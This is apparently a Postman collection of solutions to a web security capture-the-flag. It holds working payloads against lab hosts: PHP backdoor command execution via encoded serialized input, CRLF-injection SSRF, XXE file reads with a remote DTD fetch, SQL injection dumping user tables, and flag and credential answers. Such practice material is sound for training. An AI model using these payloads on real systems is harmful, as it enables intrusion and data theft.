@@ -1,0 +1,463 @@
+{
+	"info": {
+		"_postman_id": "93e3c652-845a-4f7d-9ca9-2ca1c8875556",
+		"name": "Web Security CTF",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "graphql",
+			"item": [
+				{
+					"name": "__schema",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "{ __schema { types { name, fields {name} } } }",
+								"variables": ""
+							}
+						},
+						"url": {
+							"raw": "https://confessions.secu-web.blackfoot.dev/graphql",
+							"protocol": "https",
+							"host": [
+								"confessions",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"graphql"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "requestsLog",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "graphql",
+							"graphql": {
+								"query": "{ requestsLog { timestamp, name, args } }",
+								"variables": ""
+							}
+						},
+						"url": {
+							"raw": "https://confessions.secu-web.blackfoot.dev/graphql",
+							"protocol": "https",
+							"host": [
+								"confessions",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"graphql"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "script-kidding",
+			"item": [
+				{
+					"name": "ls -al",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "formdata",
+							"formdata": [
+								{
+									"key": "4ef63abe-1abd-45a6-913d-6fb99657e24b",
+									"value": "YTozOntzOjI6ImFrIjtpOjE7czoxOiJhIjtzOjE6ImUiO3M6MToiZCI7czoyNjoiZWNobyBzaGVsbF9leGVjKCJscyAtYWwiKTsiO30=",
+									"type": "default"
+								}
+							]
+						},
+						"url": {
+							"raw": "https://script-kidding.secu-web.blackfoot.dev/i_am_not_a_backdoor.php",
+							"protocol": "https",
+							"host": [
+								"script-kidding",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"i_am_not_a_backdoor.php"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "cat i_am_a_secret_file",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "formdata",
+							"formdata": [
+								{
+									"key": "4ef63abe-1abd-45a6-913d-6fb99657e24b",
+									"value": "YTozOntzOjI6ImFrIjtpOjE7czoxOiJhIjtzOjE6ImUiO3M6MToiZCI7czo0MjoiZWNobyBzaGVsbF9leGVjKCJjYXQgaV9hbV9hX3NlY3JldF9maWxlIik7Ijt9",
+									"type": "default"
+								}
+							]
+						},
+						"url": {
+							"raw": "https://script-kidding.secu-web.blackfoot.dev/i_am_not_a_backdoor.php",
+							"protocol": "https",
+							"host": [
+								"script-kidding",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"i_am_not_a_backdoor.php"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "ssrf",
+			"item": [
+				{
+					"name": "ssrf",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "{\"login\": \"admin\", \"password\": \"admin\"}\n",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://ssrf1.secu-web.blackfoot.dev/host?host=127.0.0.1/secret? HTTP/1.1%0D%0AHost: 127.0.0.1%0D%0ACookie: GOSESSION=guest-go1.11.5%0D%0AContent-Length: 0%0D%0A%0D%0A",
+							"protocol": "https",
+							"host": [
+								"ssrf1",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"host"
+							],
+							"query": [
+								{
+									"key": "host",
+									"value": "127.0.0.1/secret? HTTP/1.1%0D%0AHost: 127.0.0.1%0D%0ACookie: GOSESSION=guest-go1.11.5%0D%0AContent-Length: 0%0D%0A%0D%0A"
+								}
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "xxe",
+			"item": [
+				{
+					"name": "xxe1",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "xml",
+									"value": "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPCFET0NUWVBFIGFbCiAgICA8IUVOVElUWSB4eGUgU1lTVEVNICJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWZsYWcucGhwIj4KXT4KPHJvb3Q+CiAgICA8bWVzc2FnZT4meHhlOzwvbWVzc2FnZT4KPC9yb290Pg==",
+									"type": "default"
+								}
+							]
+						},
+						"url": {
+							"raw": "https://xxe1.secu-web.blackfoot.dev/index.php",
+							"protocol": "https",
+							"host": [
+								"xxe1",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"index.php"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "xxe2",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "xml",
+									"value": "PCFET0NUWVBFIGNvbnZlcnQgWwo8IUVOVElUWSAlIHJlbW90ZSBTWVNURU0gImh0dHA6Ly9vdXIucmVtb3RlLnNlcnZlci94eGUuZHRkIj4KICAgICVyZW1vdGU7Cl0+",
+									"type": "default"
+								}
+							]
+						},
+						"url": {
+							"raw": "https://xxe2.secu-web.blackfoot.dev/index.php",
+							"protocol": "https",
+							"host": [
+								"xxe2",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"index.php"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "auth",
+			"item": [
+				{
+					"name": "auth50",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "username",
+									"value": "admin",
+									"type": "default"
+								},
+								{
+									"key": "password",
+									"value": "password",
+									"type": "default"
+								}
+							]
+						},
+						"url": {
+							"raw": "https://auth50.secu-web.blackfoot.dev/index.php",
+							"protocol": "https",
+							"host": [
+								"auth50",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"index.php"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "auth100",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "username",
+									"value": "Слава Україні",
+									"type": "default"
+								},
+								{
+									"key": "password",
+									"value": "4552",
+									"type": "default"
+								}
+							]
+						},
+						"url": {
+							"raw": "https://auth100.secu-web.blackfoot.dev/index.php",
+							"protocol": "https",
+							"host": [
+								"auth100",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"index.php"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "auth200",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "flag",
+									"value": "hard_to_crack_i_guess_lol!!!!",
+									"type": "default"
+								}
+							]
+						},
+						"url": {
+							"raw": "https://auth200.secu-web.blackfoot.dev/index.php",
+							"protocol": "https",
+							"host": [
+								"auth200",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"index.php"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		},
+		{
+			"name": "potionseller",
+			"item": [
+				{
+					"name": "potionseller",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "\n",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://potionseller.secu-web.blackfoot.dev/potions/NULL OR id > 3",
+							"protocol": "https",
+							"host": [
+								"potionseller",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"potions",
+								"NULL OR id > 3"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "potionseller2 - sqlite_master",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://potionseller2.secu-web.blackfoot.dev/potions/NULL) UNION SELECT name, sql, NULL, NULL, NULL, NULL FROM sqlite_master LIMIT 1 OFFSET 2--",
+							"protocol": "https",
+							"host": [
+								"potionseller2",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"potions",
+								"NULL) UNION SELECT name, sql, NULL, NULL, NULL, NULL FROM sqlite_master LIMIT 1 OFFSET 2--"
+							]
+						}
+					},
+					"response": []
+				},
+				{
+					"name": "potionseller2 - users",
+					"protocolProfileBehavior": {
+						"disableBodyPruning": true
+					},
+					"request": {
+						"method": "GET",
+						"header": [],
+						"body": {
+							"mode": "raw",
+							"raw": "",
+							"options": {
+								"raw": {
+									"language": "json"
+								}
+							}
+						},
+						"url": {
+							"raw": "https://potionseller2.secu-web.blackfoot.dev/potions/NULL) UNION SELECT *, NULL, NULL, NULL FROM users--",
+							"protocol": "https",
+							"host": [
+								"potionseller2",
+								"secu-web",
+								"blackfoot",
+								"dev"
+							],
+							"path": [
+								"potions",
+								"NULL) UNION SELECT *, NULL, NULL, NULL FROM users--"
+							]
+						}
+					},
+					"response": []
+				}
+			]
+		}
+	]
+}
